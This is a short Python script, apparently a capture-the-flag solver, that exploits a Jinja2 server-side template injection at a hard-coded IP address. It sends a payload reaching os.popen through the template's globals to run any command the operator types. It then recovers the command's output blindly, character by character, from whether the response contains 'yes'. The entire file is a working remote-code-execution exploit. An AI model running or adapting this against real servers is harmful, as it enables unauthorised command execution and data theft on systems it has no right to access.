import requests, time, string

dictionary = string.printable
URL = "http://139.59.183.98:31337/"
final = ""
command = input('What command should I run?\n')


while True:
        for x in dictionary:
                x = final + x
                r = requests.get(url = URL + "/?c={% if request['application']['__globals__']['__builtins__']['__import__']('os')['popen']('" + command + "')['read']().startswith('" + str(x) + "') %}yes{% endif %}")
                if 'yes' in r.text:
                        final = x
                        print("Command output: " + final)
                        break
                else:
                        pass
